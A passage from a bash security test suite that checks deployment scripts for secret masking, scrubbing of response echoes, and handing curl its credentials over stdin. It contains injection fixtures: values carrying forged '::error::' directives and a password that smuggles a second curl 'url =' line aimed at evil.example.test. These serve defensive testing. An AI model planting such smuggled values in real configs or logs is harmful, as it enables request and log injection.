ar_g2="$(awk '/^    PG=\$\(doppler secrets get INNGEST_POSTGRES_URI/{f=1} f{print} f&&/^    \[\[ -n "\$PG_DARK" \]\]/{exit}' "$CUT")"
ar_g35="$(awk '/^    PARITY_FAIL=0$/{f=1} f{print} f&&/^    echo "::notice::op=arm: G3.5 channel-key parity gate PASSED/{exit}' "$CUT")"
[[ "$ar_g2" == *'_mask_ok "$PG"'* && "$ar_g2" == *'_mask_ok "$HB"'* && "$ar_g2" == *'_mask_ok "$PG_DARK"'* && "$ar_g35" == *'_mask_ok "$APP_CK"'* && "$ar_g35" == *'_mask_ok "$HOST_CK"'* ]] || fatal "lead (b): the op=arm mask sites were not extracted from $CUT"
ar_run() { # <row> <chunk text> <NAME=value>...: the chunk under the script's own _mask_ok, DOPPLER_TOKEN_INNGEST_ARM set, doppler stubbed by NAME and scope
  local row="$ROWS/$1" txt="$2"; shift 2
  assert_fixture_dir "$row"; mkdir -p "$row/shim"
  { printf 'set -euo pipefail\nDOPPLER_TOKEN_INNGEST_ARM=armtoken\n'; grep -m1 '^_mask_ok() {' "$CUT"; printf '%s\n' "$txt"; printf 'echo DRV-AFTER\n'; } > "$row/drv.sh"
  ( cd "$row" && env -i PATH="$LD_BIN:$LD_REAL" "$@" "$BASH_BIN" "$row/drv.sh" < /dev/null > "$row/stdout" 2> "$row/stderr" )
  LD_RC=$?
}
AR_SCHEME=postgresql; AR_PW1=synth-pass; AR_DSN="${AR_SCHEME}://synth_user:${AR_PW1}@aws-0.pooler.example.test:5432/postgres?sslmode=require&x=1"
AR_URL='https://uptime.example.test/api/v1/heartbeat/synthetic-heartbeat-path'
AR_PW2=dark-pass; AR_DARK="${AR_SCHEME}://dark_user:${AR_PW2}@dark.example.test:5432/postgres"
AR_KEY="evt-synthetic-$(od -An -N6 -tx1 /dev/urandom | tr -d ' \n')"
AR_FORGED="SYNTHMARK0001"$'\n'"::error::forged-by-the-value"
# ar_env <chunk g2|g35> <mode>: sets AR_ENV (the NAME=value assignments the doppler stub serves) and AR_WANT_MASKS (the values that must be masked, in read order).
#   modes: ok | hostile-<which> (that ONE read is AR_FORGED: a value holding a newline and a forged ::error:: line) | empty (g2: the DSN; g35: every key)
ar_env() {
  local pg="$AR_DSN" hb="$AR_URL" dk="$AR_DARK" ea="$AR_KEY" sa="$AR_KEY" eh="$AR_KEY" sh="$AR_KEY"
  case "$1:$2" in
    g2:hostile-pg) pg="$AR_FORGED" ;; g2:hostile-hb) hb="$AR_FORGED" ;; g2:hostile-dark) dk="$AR_FORGED" ;; g2:empty) pg="" ;;
    g35:hostile-app) ea="$AR_FORGED" ;; g35:hostile-host) eh="$AR_FORGED" ;; g35:empty) ea=""; sa=""; eh=""; sh="" ;;
  esac
  AR_ENV=(BK_A_INNGEST_POSTGRES_URI="$pg" BK_A_INNGEST_HEARTBEAT_URL="$hb" BK_H_INNGEST_POSTGRES_URI="$dk"
          BK_A_INNGEST_EVENT_KEY="$ea" BK_A_INNGEST_SIGNING_KEY="$sa" BK_H_INNGEST_EVENT_KEY="$eh" BK_H_INNGEST_SIGNING_KEY="$sh")
  AR_WANT_MASKS=()
  if [[ "$1" == g2 ]]; then
    [[ "$pg" == "$AR_FORGED" || -z "$pg" ]] || AR_WANT_MASKS+=("$pg"); [[ "$hb" == "$AR_FORGED" ]] || AR_WANT_MASKS+=("$hb"); [[ "$dk" == "$AR_FORGED" ]] || AR_WANT_MASKS+=("$dk")
    [[ "$2" == empty ]] && AR_WANT_MASKS=("$hb")
  else
    [[ "$ea" == "$AR_FORGED" || -z "$ea" ]] || AR_WANT_MASKS+=("$ea"); [[ "$eh" == "$AR_FORGED" || -z "$eh" ]] || AR_WANT_MASKS+=("$eh")
    AR_WANT_MASKS+=("$sa" "$sh"); [[ "$2" == empty ]] && AR_WANT_MASKS=()
  fi
}
ar_check() { # <row> <chunk> <mode> -> LD_BAD: the mask lines are EXACTLY the wanted values, one line each, in read order; a hostile value is printed nowhere
  local o="$ROWS/$1/stdout" chunk="$2" mode="$3" want="" v; LD_BAD=""
  for v in ${AR_WANT_MASKS[@]+"${AR_WANT_MASKS[@]}"}; do want+="::add-mask::$v"$'\n'; done
  [[ "$(grep '^::add-mask::' "$o" || true)"$'\n' == "$want" || ( -z "$want" && -z "$(grep '^::add-mask::' "$o" || true)" ) ]] || LD_BAD+=" mask-lines"
  [[ "$(grep -c '^::add-mask::$' "$o" || true)" == 0 ]] || LD_BAD+=" bare-directive"
  case "$mode" in
    ok) [[ "$LD_RC" -eq 0 && "$(bk_count "$o" DRV-AFTER)" == 1 ]] || LD_BAD+=" rc=$LD_RC" ;;
    hostile-*)
      [[ "$(grep -c '^::error::forged-by-the-value' "$o" || true)" == 0 ]] || LD_BAD+=" forged-directive"
      [[ "$(bk_count "$o" SYNTHMARK0001)" == 0 ]] || LD_BAD+=" value-in-output" ;;
    empty) [[ "$LD_RC" -eq 1 && "$(bk_count "$o" DRV-AFTER)" == 0 ]] || LD_BAD+=" rc=$LD_RC"
      [[ "$chunk" != g2 || "$(bk_count "$o" '::error::op=arm: a source value')" == 1 ]] || LD_BAD+=" existing-refusal" ;;
  esac
}
ar_drive() { # <row> <chunk g2|g35> <mode> [chunk text override]
  local txt="$ar_g2"; [[ "$2" == g35 ]] && txt="$ar_g35"; [[ -n "${4:-}" ]] && txt="$4"
  ar_env "$2" "$3"; ar_run "$1" "$txt" "${AR_ENV[@]}"; ar_check "$1" "$2" "$3"
}
ar_drive ar-g2-ok g2 ok
if [[ -z "$LD_BAD" ]]; then row "lead (b) op=arm G2/G3 driven with a DSN, a heartbeat URL and a dark DSN (control, values carrying : @ ? &): each is masked exactly once, in read order, by its own '::add-mask::<value>' line" ok
else row "lead (b) op=arm G2/G3 driven with a DSN, a heartbeat URL and a dark DSN (control, values carrying : @ ? &): each is masked exactly once, in read order, by its own '::add-mask::<value>' line" fail "$LD_BAD"; fi
ld_bad=""
for ld_m in hostile-pg hostile-hb hostile-dark; do ar_drive "ar-g2-$ld_m" g2 "$ld_m"; [[ -z "$LD_BAD" ]] || ld_bad+=" [$ld_m:$LD_BAD]"; done
if [[ -z "$ld_bad" ]]; then row "lead (b) op=arm G2/G3 driven with each of the DSN, the heartbeat URL and the dark DSN holding a newline and a forged ::error:: directive: that value is never printed (no mask line, no forged line at a line start) and the other two are still masked" ok
else row "lead (b) op=arm G2/G3 driven with each of the DSN, the heartbeat URL and the dark DSN holding a newline and a forged ::error:: directive: that value is never printed (no mask line, no forged line at a line start) and the other two are still masked" fail "$ld_bad"; fi
ar_drive ar-g2-empty g2 empty
if [[ -z "$LD_BAD" ]]; then row "lead (b) op=arm G2 driven with an EMPTY DSN: no bare '::add-mask::' directive is printed (-n kept) and the arm's existing 'source value is empty' refusal still ends the run" ok
else row "lead (b) op=arm G2 driven with an EMPTY DSN: no bare '::add-mask::' directive is printed (-n kept) and the arm's existing 'source value is empty' refusal still ends the run" fail "$LD_BAD"; fi
ar_drive ar-g35-ok g35 ok
if [[ -z "$LD_BAD" ]]; then row "lead (b) op=arm G3.5 channel-key loop driven with matching keys (control): the app and host reads of both keys are each masked once by their own line" ok
else row "lead (b) op=arm G3.5 channel-key loop driven with matching keys (control): the app and host reads of both keys are each masked once by their own line" fail "$LD_BAD"; fi
ld_bad=""
for ld_m in hostile-app hostile-host; do ar_drive "ar-g35-$ld_m" g35 "$ld_m"; [[ "$LD_RC" -eq 1 ]] || LD_BAD+=" rc=$LD_RC"; [[ -z "$LD_BAD" ]] || ld_bad+=" [$ld_m:$LD_BAD]"; done
if [[ -z "$ld_bad" ]]; then row "lead (b) op=arm G3.5 driven with the app key, then the host key, holding a newline and a forged ::error:: directive: it is never printed (no forged line, no value), the other three reads are still masked, and the parity gate refuses" ok
else row "lead (b) op=arm G3.5 driven with the app key, then the host key, holding a newline and a forged ::error:: directive: it is never printed (no forged line, no value), the other three reads are still masked, and the parity gate refuses" fail "$ld_bad"; fi
ar_drive ar-g35-empty g35 empty
if [[ -z "$LD_BAD" ]]; then row "lead (b) op=arm G3.5 driven with every key EMPTY: no bare '::add-mask::' directive is printed (-n kept) and the parity gate refuses" ok
else row "lead (b) op=arm G3.5 driven with every key EMPTY: no bare '::add-mask::' directive is printed (-n kept) and the parity gate refuses" fail "$LD_BAD"; fi
ld_bad=""; ld_n=0
while IFS='|' read -r ld_name ld_chunk ld_mode ld_from ld_to ld_must; do
  [[ -n "$ld_name" ]] || continue
  if [[ "$ld_chunk" == g2 ]]; then ld_txt="$ar_g2"; else ld_txt="$ar_g35"; fi
  text_mut "$ld_txt" "$ld_from" "$ld_to"
  ar_drive "ar-mut-$ld_name" "$ld_chunk" "$ld_mode" "$TM_OUT"
  ld_n=$((ld_n + 1)); ld_caught "$LD_BAD" "$ld_must" || ld_bad+=" [$ld_name: got '${LD_BAD:-<none>}' wanted a failure naming '$ld_must']"
done <<'AR_MUTANTS'
pg-unchecked|g2|hostile-pg|    [[ -n "$PG" ]] && _mask_ok "$PG" && printf|    [[ -n "$PG" ]] && printf|forged-directive
hb-unchecked|g2|hostile-hb|    [[ -n "$HB" ]] && _mask_ok "$HB" && printf|    [[ -n "$HB" ]] && printf|forged-directive
pgdark-unchecked|g2|hostile-dark|    [[ -n "$PG_DARK" ]] && _mask_ok "$PG_DARK" && printf|    [[ -n "$PG_DARK" ]] && printf|forged-directive
pg-bare-on-empty|g2|empty|    [[ -n "$PG" ]] && _mask_ok "$PG" && printf|    printf|bare-directive
pg-bearer-shaped|g2|ok|    [[ -n "$PG" ]] && _mask_ok "$PG" && printf|    [[ -n "$PG" ]] && _bearer_ok "$PG" && printf|mask-lines
app-unchecked|g35|hostile-app|      [[ -n "$APP_CK" ]] && _mask_ok "$APP_CK" && printf|      [[ -n "$APP_CK" ]] && printf|forged-directive
host-unchecked|g35|hostile-host|      [[ -n "$HOST_CK" ]] && _mask_ok "$HOST_CK" && printf|      [[ -n "$HOST_CK" ]] && printf|forged-directive
host-bare-on-empty|g35|empty|      [[ -n "$HOST_CK" ]] && _mask_ok "$HOST_CK" && printf|      printf|bare-directive
AR_MUTANTS
[[ "$ld_n" == 8 ]] || ld_bad+=" [ran $ld_n of 8 mutants]"
if [[ -z "$ld_bad" ]]; then row "lead (b) mutants: each of the five mask lines with its shape check removed is caught on a hostile value, a mask line with no -n guard on an empty read is caught, and a bearer-shaped check (which would leave a DSN unmasked) is caught" ok
else row "lead (b) mutants: each of the five mask lines with its shape check removed is caught on a hostile value, a mask line with no -n guard on an empty read is caught, and a bearer-shaped check (which would leave a DSN unmasked) is caught" fail "$ld_bad"; fi

# ---- (g) the four response-body echoes ------------------------------------------------------------------------
# Each statement is taken verbatim from the script and run with a BODY whose first line is hostile (an ESC sequence, a CR, a forged `::error::` start, 300
# characters) and whose second line is a canary: the output is ONE line that starts with the arm's own text, holds the bounded scrubbed first line and not the canary.
gb_canary="BODYCANARY-$(od -An -N6 -tx1 /dev/urandom | tr -d ' \n')"
gb_first="::error::forged-first-line"$'\e[31m'$'\r'"$(printf 'x%.0s' $(seq 1 300))"
gb_body="$gb_first"$'\n'"$gb_canary"
gb_stmt() { # <grep anchor> -> the single script line
  grep -m1 -F -- "$1" "$CUT" | sed -E 's/^[[:space:]]+//'
}
gb_fn="$(grep -m1 '^_body_head() {' "$CUT")"
[[ -n "$gb_fn" ]] || fatal "lead (g): _body_head is missing from $CUT"
gb_run() { # <row> <statement> <body> [function text, default the script's own _body_head] -> $ROWS/<row>/out
  local row="$ROWS/$1"; assert_fixture_dir "$row"; mkdir -p "$row/tmp"
  { printf 'set -euo pipefail\n'; printf '%s\n' "${4:-$gb_fn}"; printf '%s\n' "$2" | sed 's|/tmp/rearm-body|${BK_TMP}/rearm-body|g'; } > "$row/drv.sh"
  printf '%s' "$3" > "$row/tmp/rearm-body"
  ( cd "$row" && env -i PATH="$LD_REAL" BK_TMP="$row/tmp" BODY="$3" "$BASH_BIN" "$row/drv.sh" < /dev/null > "$row/out" 2>&1 )
  LD_RC=$?
}
gb_want="$(printf '%s' "$gb_first" | LC_ALL=C tr -c ' -~' '?' | cut -c1-160)"
gb_check() { # <row> <text the one output line must start with> -> LD_BAD
  local o="$ROWS/$1/out" want="$2" first; LD_BAD=""
  first="$(head -n1 "$o")"
  [[ "$(wc -l < "$o" | tr -d ' ')" == 1 ]] || LD_BAD+=" not-one-line"
  [[ "$first" == "$want"* ]] || LD_BAD+=" arm-text"
  [[ "$(bk_count "$o" "$gb_canary")" == 0 ]] || LD_BAD+=" second-line-leaked"
  [[ -z "$(LC_ALL=C tr -d '\n -~' < "$o")" ]] || LD_BAD+=" non-printable"
  [[ "$first" == *"$gb_want" || "$first" == *"$gb_want)" ]] || LD_BAD+=" head-not-bounded-and-scrubbed"
  [[ "$first" != *"${gb_want}x"* ]] || LD_BAD+=" head-longer-than-160"
}
gb_bad=""; gb_n=0
while IFS='~' read -r gb_name gb_anchor gb_text; do
  [[ -n "$gb_name" ]] || continue
  gb_line="$(gb_stmt "$gb_anchor")"; [[ -n "$gb_line" ]] || { gb_bad+=" [$gb_name: statement not found]"; continue; }
  [[ "$gb_line" == *'_body_head'* ]] || gb_bad+=" [$gb_name: no _body_head]"
  gb_run "gb-$gb_name" "$gb_line" "$gb_body"; gb_check "gb-$gb_name" "$gb_text"; gb_n=$((gb_n + 1))
  [[ -z "$LD_BAD" ]] || gb_bad+=" [$gb_name:$LD_BAD]"
done <<'GB_SITES'
enumerate~echo "::error::enumerate did not return a JSON array~::error::enumerate did not return a JSON array (first line of the response, bounded and scrubbed: 
registry-probe~echo "::error::registry-probe did not return a {registry_empty,function_count,function_ids} object~::error::registry-probe did not return a {registry_empty,function_count,function_ids} object (first line of the response, bounded and scrubbed: 
doublefire-probe~echo "::error::doublefire-probe did not return a {runs:[...]} object~::error::doublefire-probe did not return a {runs:[...]} object (first line of the response, bounded and scrubbed: 
rearm~echo "re-arm response (first line, bounded and scrubbed)~re-arm response (first line, bounded and scrubbed): 
GB_SITES
[[ "$gb_n" == 4 ]] || gb_bad+=" [ran $gb_n of 4 sites]"
if [[ -z "$gb_bad" ]]; then row "lead (g) the enumerate, registry-probe, doublefire-probe and re-arm body echoes, driven with a body whose first line holds an ESC sequence, a CR, a forged ::error:: start and 300 characters, print ONE line: the arm's own text, then the first line cut at 160 characters with every non-printable byte replaced, and never the second line" ok
else row "lead (g) the enumerate, registry-probe, doublefire-probe and re-arm body echoes, driven with a body whose first line holds an ESC sequence, a CR, a forged ::error:: start and 300 characters, print ONE line: the arm's own text, then the first line cut at 160 characters with every non-printable byte replaced, and never the second line" fail "$gb_bad"; fi
gb_line="$(gb_stmt 'echo "::error::enumerate did not return a JSON array')"
gb_run gb-ctl "$gb_line" 'HTTP 502 Bad Gateway'$'\n'"$gb_canary"
if [[ "$(head -n1 "$ROWS/gb-ctl/out")" == '::error::enumerate did not return a JSON array (first line of the response, bounded and scrubbed: HTTP 502 Bad Gateway)' && "$(wc -l < "$ROWS/gb-ctl/out" | tr -d ' ')" == 1 ]]; then row "lead (g) control: a short plain first line is printed intact (the scrub does not eat a readable cause)" ok
else row "lead (g) control: a short plain first line is printed intact (the scrub does not eat a readable cause)" fail "$(head -c 200 "$ROWS/gb-ctl/out")"; fi
gb_bad=""; gb_n=0
while IFS='|' read -r gb_name gb_kind gb_from gb_to gb_must; do
  [[ -n "$gb_name" ]] || continue
  case "$gb_kind" in
    fn)      text_mut "$gb_fn" "$gb_from" "$gb_to"; gb_run "gb-mut-$gb_name" "$gb_line" "$gb_body" "$TM_OUT" ;;
    fnshort) text_mut "$gb_fn" "$gb_from" "$gb_to"; gb_run "gb-mut-$gb_name" "$gb_line" 'HTTP 502 Bad Gateway'$'\n'"$gb_canary" "$TM_OUT" ;;
    *)       text_mut "$gb_line" "$gb_from" "$gb_to"; gb_run "gb-mut-$gb_name" "$TM_OUT" "$gb_body" ;;
  esac
  if [[ "$gb_kind" == fnshort ]]; then   # a SHORT first line (the cut at 160 cannot hide a kept second line): only the canary clause applies
    LD_BAD=""; [[ "$(bk_count "$ROWS/gb-mut-$gb_name/out" "$gb_canary")" == 0 ]] || LD_BAD+=" second-line-leaked"
  else gb_check "gb-mut-$gb_name" '::error::enumerate did not return a JSON array (first line of the response, bounded and scrubbed: '; fi
  gb_n=$((gb_n + 1))
  ld_caught "$LD_BAD" "$gb_must" || gb_bad+=" [$gb_name: got '${LD_BAD:-<none>}' wanted a failure naming '$gb_must']"
done <<'GB_MUTANTS'
raw-body|line|$(_body_head "$BODY")|$BODY|second-line-leaked
unbounded|fn|${_h:0:160}|${_h:0:400}|head-not-bounded-and-scrubbed
unscrubbed|fn|_h="${_h//[^ -~]/?}"; ||non-printable
whole-body|fnshort|_h="${1%%$'\n'*}"|_h="$1"|second-line-leaked
GB_MUTANTS
[[ "$gb_n" == 4 ]] || gb_bad+=" [ran $gb_n of 4 mutants]"
if [[ -z "$gb_bad" ]]; then row "lead (g) mutants: the raw body printed, a head that is not cut at 160, a head that is not scrubbed and a head that keeps every line are each caught" ok
else row "lead (g) mutants: the raw body printed, a head that is not cut at 160, a head that is not scrubbed and a head that keeps every line are each caught" fail "$gb_bad"; fi
echo "=== stage S2-A part 2: cutover HMAC copies, refusal marker, canary sweep done ==="

# =====================================================================================
# STAGE S2-B: scripts/betterstack-query.sh. The Better Stack ClickHouse basic-auth pair leaves curl's
# argument list (`-u USER:PASS`, readable by every local user in /proc/<pid>/cmdline) for a `user = "..."`
# line on the stdin config channel, behind a DENY-LIST guard. The guard is the set of bytes that can break a
# quoted config value (a double quote, a backslash, a newline) plus every control character, plus a colon in
# the USERNAME (the first colon separates user from password), plus empties. Refusal exits 2, never 1
# (`bs_read_classify` maps 1 to "blame DOPPLER_TOKEN"), with one value-free marker line and one stderr line
# naming only the variable. The empty-credential case stays the script's existing exit 3 (before run_sql).
#
# THE INSTRUMENTS ARE CALIBRATED AGAINST THE REAL CURL, not against the author's belief: control CBS1/CBS2
# compare the shim's parse of a `user = "..."` line with `curl --libcurl` (CURLOPT_USERPWD, and a SECOND
# CURLOPT_URL for a hostile value), and the byte sweep runs bytes 0x01..0x7f through the real curl and then
# through the real script, so the deny-list is validated by an oracle and not by the characters it names.
# =====================================================================================
BSQ="scripts/betterstack-query.sh"
[[ -f "$BSQ" ]] || fatal "stage S2-B: $BSQ is missing"
BSBIN="$TMPD/bsbin"; BSDIR="$TMPD/bs"
for d in "$BSBIN" "$BSDIR"; do assert_fixture_dir "$d"; mkdir -p "$d"; done
cat > "$BSBIN/curl" <<'BS_CURL_EOF'
#!/usr/bin/env bash
# Recording curl for the Better Stack reader rows. Records argv (NUL-delimited), and for `--config -` the stdin
# verbatim plus a parse of it: a bare `user = "..."` line is the credential pair (calls/<n>.userpwd); ANY other
# non-blank line is recorded as INJECTED (its CONTENT is never written). A `-u`/`--user` flag is recorded as
# calls/<n>.userflag. Auth-gated: 200 only when the pair equals BS_FIXTURE_PAIR, else curl's exit 22 (401).
set -u
D="${BS_SHIM:?}"; mkdir -p "$D/calls"
n=0; [[ -r "$D/counter" ]] && read -r n < "$D/counter"
n=$((n + 1)); printf '%s\n' "$n" > "$D/counter"
C="$D/calls/$n"
printf '%s\0' "$@" > "$C.argv"
unm() { printf 'UNMODELLED FLAG: %s\n' "$1" >&2; printf '%s\n' "$1" >> "$D/unmodelled"; exit 99; }
a=("$@"); i=0; cfg=0
while (( i < ${#a[@]} )); do
  x="${a[i]}"; i=$((i + 1))
  case "$x" in
    --disable|-s|-S|-sS|--fail-with-body|--fail) : ;;
    --noproxy|--max-time|-H|--header|-X|--request|-d|--data) i=$((i + 1)) ;;
    --config) [[ "${a[i]:-}" == "-" ]] || unm "--config <file>"; cfg=1; i=$((i + 1)) ;;
    -u|--user) printf 'flag\n' > "$C.userflag"; printf '%s' "${a[i]:-}" > "$C.userpwd"; i=$((i + 1)) ;;
    --user=*) printf 'flag\n' > "$C.userflag"; printf '%s' "${x#--user=}" > "$C.userpwd" ;;
    http*) : ;;
    *) unm "$x" ;;
  esac
done
if (( cfg )); then
  data="$(cat; printf x)"; data="${data%x}"
  printf '%s' "$data" > "$C.stdin"
  ln=0
  while IFS= read -r line || [[ -n "$line" ]]; do
    ln=$((ln + 1)); [[ -z "$line" || "$line" == \#* ]] && continue
    if [[ "$line" =~ ^user\ =\ \"([^\"\\]*)\"$ ]]; then printf '%s' "${BASH_REMATCH[1]}" > "$C.userpwd"
    else printf 'INJECTED: stdin config line %s is not a bare user directive\n' "$ln" >> "$C.injected"; fi
  done < <(printf '%s' "$data")
fi
ok=0
if [[ -n "${BS_FIXTURE_PAIR:-}" && -r "$C.userpwd" ]]; then
  got="$(cat "$C.userpwd"; printf x)"
  [[ "$got" == "${BS_FIXTURE_PAIR}x" ]] && ok=1
fi
if (( ok )); then printf '{"dt":"2026-10-01 00:00:00","raw":"{}"}\n'; exit 0; fi
printf '{"detail":"Unauthorized"}\n'
printf 'curl: (22) The requested URL returned error: 401\n' >&2
exit 22
BS_CURL_EOF
sed -i "1s|.*|#!${BASH_BIN}|" "$BSBIN/curl"
chmod +x "$BSBIN/curl"

# The real-curl oracle: decode the C literal `--libcurl` writes (octal, \xHH, \n \r \t \? \\ \" \') and report
# how many CURLOPT_URL calls there are and whether CURLOPT_USERPWD equals the expected pair (given as hex).
BS_DEC="$BSDIR/cdecode.py"
cat > "$BS_DEC" <<'BS_PY_EOF'
import re, sys
src = open(sys.argv[1], encoding="latin-1").read()
want = bytes.fromhex(sys.argv[2])
urls = len(re.findall(r"CURLOPT_URL,", src))
m = re.search(r'CURLOPT_USERPWD, "((?:[^"\\\n]|\\.)*)"\);', src)
ok = 0
if m:
    s, out, i = m.group(1), bytearray(), 0
    simple = {"n": 10, "r": 13, "t": 9, "a": 7, "b": 8, "f": 12, "v": 11}
    while i < len(s):
        ch = s[i]
        if ch != "\\":
            out += ch.encode("latin-1"); i += 1; continue
        i += 1; e = s[i]
        if e in simple: out.append(simple[e]); i += 1
        elif e in "\\\"'?": out += e.encode(); i += 1
        elif e in "01234567":
            j = i
            while j < len(s) and j < i + 3 and s[j] in "01234567": j += 1
            out.append(int(s[i:j], 8) & 255); i = j
        elif e == "x":
            j = i + 1
            while j < len(s) and j < i + 3 and s[j] in "0123456789abcdefABCDEF": j += 1
            out.append(int(s[i + 1:j], 16) & 255); i = j
        else:
            out += ("\\" + e).encode(); i += 1
    ok = 1 if bytes(out) == want else 0
print("urls=%d ok=%d" % (urls, ok))
BS_PY_EOF
BS_OR_URLS=0; BS_OR_OK=0
bs_oracle() { # <pair>: the REAL curl parses `user = "<pair>"` from stdin -> BS_OR_URLS, BS_OR_OK
  local c="$BSDIR/oracle.c" hex res; rm -f "$c"
  hex="$(printf '%s' "$1" | od -An -v -tx1 | tr -d ' \n')"
  "$REAL_CURL" --disable --noproxy '*' -sS --max-time 3 --libcurl "$c" --config - http://127.0.0.1:9/ < <(printf 'user = "%s"\n' "$1") >/dev/null 2>&1 || true
  res="$("$REAL_PY" -I "$BS_DEC" "$c" "$hex" 2>/dev/null || true)"
  [[ "$res" =~ ^urls=([0-9]+)\ ok=([01])$ ]] || { BS_OR_URLS=-1; BS_OR_OK=0; return 0; }
  BS_OR_URLS="${BASH_REMATCH[1]}"; BS_OR_OK="${BASH_REMATCH[2]}"
}
bs_shim_direct() { # <pair> <rowname>: the shim parses `user = "<pair>"` from stdin -> $ROWS/<rowname>/shim/calls/1.*
  local row="$ROWS/$2"; assert_fixture_dir "$row"; mkdir -p "$row/shim"
  ( cd "$row" && env -i PATH="$BSBIN:$REALBIN" BS_SHIM="$row/shim" "$BSBIN/curl" --disable --config - http://127.0.0.1:9/ < <(printf 'user = "%s"\n' "$1") > /dev/null 2>&1 )
  return 0
}

BS_HEX="$(od -An -N6 -tx1 /dev/urandom | tr -d ' \n')"
BS_USER="bsuser-$BS_HEX"
BS_PASS="Pw-$BS_HEX"'$#;!+/=:%'
BS_PAIR="$BS_USER:$BS_PASS"
BS_HOST="eu-central-1a-connect.betterstackdata.com"
BS_SQL="SELECT 1 FORMAT JSONEachRow"

# CBS1: the shim and the real curl agree on a realistic pair (`$ # ; ! + / = : %` in the password).
bs_oracle "$BS_PAIR"
bs_shim_direct "$BS_PAIR" cbs1
if [[ "$BS_OR_URLS" == 1 && "$BS_OR_OK" == 1 && -r "$ROWS/cbs1/shim/calls/1.userpwd" && ! -e "$ROWS/cbs1/shim/calls/1.injected" \
      && "$(cat "$ROWS/cbs1/shim/calls/1.userpwd"; printf x)" == "${BS_PAIR}x" ]]; then
  row "control CBS1: real curl (--libcurl) delivers the realistic pair as one CURLOPT_USERPWD and one CURLOPT_URL, and the shim parses the same pair with no INJECTED" ok
else fatal "CBS1 oracle/shim disagree on a clean pair (urls=$BS_OR_URLS ok=$BS_OR_OK)"; fi
# CBS2: a hostile value injects a SECOND request in real curl, and the shim records INJECTED for the same input.
BS_HOSTILE_PW="SYNTHBSHOST${BS_HEX}x\"$(printf '\nurl = "http://evil.example.test/second')"
bs_oracle "$BS_USER:$BS_HOSTILE_PW"
bs_shim_direct "$BS_USER:$BS_HOSTILE_PW" cbs2
if [[ "$BS_OR_URLS" -ge 2 && -s "$ROWS/cbs2/shim/calls/1.injected" ]]; then
  row "control CBS2: a hostile quote+newline+url value yields a SECOND CURLOPT_URL in real curl and an INJECTED record in the shim" ok
else fatal "CBS2 the shim did not record INJECTED for the value real curl injects a request with (urls=$BS_OR_URLS)"; fi

BS_RC=0; BS_SCRIPT="$REPO_ROOT/$BSQ"; BS_ARGS=("$BS_SQL")
bs_run() { # <rowname> <user> <pass> -> BS_RC, $ROWS/<rowname>/{stdout,stderr,shim/}   (BS_SCRIPT and BS_ARGS select script and arguments)
  local row="$ROWS/$1"; assert_fixture_dir "$row"; mkdir -p "$row/home" "$row/tmp" "$row/shim"
  ( cd "$row" && env -i PATH="$BSBIN:$REALBIN" HOME="$row/home" TMPDIR="$row/tmp" BS_SHIM="$row/shim" BS_FIXTURE_PAIR="$BS_PAIR" \
      BETTERSTACK_QUERY_HOST="$BS_HOST" BETTERSTACK_QUERY_USERNAME="$2" BETTERSTACK_QUERY_PASSWORD="$3" \
      "$BASH_BIN" "$BS_SCRIPT" "${BS_ARGS[@]}" < /dev/null > "$row/stdout" 2> "$row/stderr" )
  BS_RC=$?
}
BS_MARKER_PFX='SOLEUR_CREDENTIAL_REFUSED script=betterstack-query reason='
# bs_refusal <rowname> <reason> <variable> <canary-or-empty> -> BS_BAD (space-separated failed check names, empty = held)
bs_refusal() {
  local row="$ROWS/$1" reason="$2" var="$3" canary="$4" other nl
  BS_BAD=""
  [[ "$BS_RC" -eq 2 ]] || BS_BAD+=" rc=$BS_RC"
  [[ "$(bk_calls "$row")" == 0 ]] || BS_BAD+=" curl-called"
  [[ "$(grep -cxF -- "${BS_MARKER_PFX}${reason}" "$row/stderr" || true)" == 1 ]] || BS_BAD+=" marker-line"
  [[ "$(grep -cF -- 'SOLEUR_CREDENTIAL_REFUSED' "$row/stderr" "$row/stdout" | awk -F: '{n+=$NF} END {print n+0}')" == 1 ]] || BS_BAD+=" marker-count"
  nl="$(wc -l < "$row/stderr" | tr -d ' ')"; [[ "$nl" == 2 ]] || BS_BAD+=" stderr-lines=$nl"
  [[ "$(grep -v 'SOLEUR_CREDENTIAL_REFUSED' "$row/stderr" | grep -cF -- "$var" || true)" == 1 ]] || BS_BAD+=" variable-line"
  other=BETTERSTACK_QUERY_USERNAME; [[ "$var" == BETTERSTACK_QUERY_USERNAME ]] && other=BETTERSTACK_QUERY_PASSWORD
  [[ "$(grep -cF -- "$other" "$row/stderr" || true)" == 0 ]] || BS_BAD+=" other-variable-named"
  if [[ -n "$canary" ]]; then
    [[ "$(grep -cF -- "$canary" "$row/stdout" "$row/stderr" | awk -F: '{n+=$NF} END {print n+0}')" == 0 ]] || BS_BAD+=" value-in-output"
  fi
  [[ "$(grep -cF -- 'http://evil.example.test' "$row/stdout" "$row/stderr" | awk -F: '{n+=$NF} END {print n+0}')" == 0 ]] || BS_BAD+=" injected-url-in-output"
  [[ ! -e "$row/shim/unmodelled" ]] || BS_BAD+=" unmodelled-flag"
  return 0
}
# bs_ok_call <rowname>: the invariants of a well-formed call -> BS_BAD
bs_ok_call() {
  local row="$ROWS/$1" f c tok
  BS_BAD=""
  [[ "$BS_RC" -eq 0 ]] || BS_BAD+=" rc=$BS_RC"
  [[ "$(bk_calls "$row")" == 1 ]] || BS_BAD+=" calls=$(bk_calls "$row")"
  c="$row/shim/calls/1"
  [[ -r "$c.argv" ]] || { BS_BAD+=" no-argv"; return 0; }
  [[ ! -e "$c.userflag" ]] || BS_BAD+=" user-flag-in-argv"
  [[ ! -e "$c.injected" ]] || BS_BAD+=" injected"
  # no -u / --user / --user= token in the recorded argv, whatever the spelling: `--user`, `--user=...` and a short-flag bundle ending in u (which
  # includes a bare -u; the old separate `-u` alternative was subsumed by the bundle one and so could not be driven alone). Each alternative has a control.
  # The bundle alphabet is the one the lint proved against the real curl: digits (-4u, -6u, -0u) and `#` (-#u) bundle with the letters, so `[A-Za-z]*` missed them.
  [[ "$(tr '\0' '\n' < "$c.argv" | grep -cE -- '^(--user|--user=.*|-[0-9A-Za-z#]*u)$' || true)" == 0 ]] || BS_BAD+=" user-token-in-argv"
  for tok in "$BS_USER" "$BS_PASS"; do
    [[ "$(grep -caF -- "$tok" "$c.argv" || true)" == 0 ]] || BS_BAD+=" value-in-argv"
  done
  [[ "$(cat "$c.stdin" 2>/dev/null; printf x)" == "user = \"$BS_PAIR\""$'\n'x ]] || BS_BAD+=" stdin-is-not-exactly-one-user-line"
  [[ "$(grep -c '^user = "' "$c.stdin" 2>/dev/null || true)" == 1 ]] || BS_BAD+=" user-line-count"
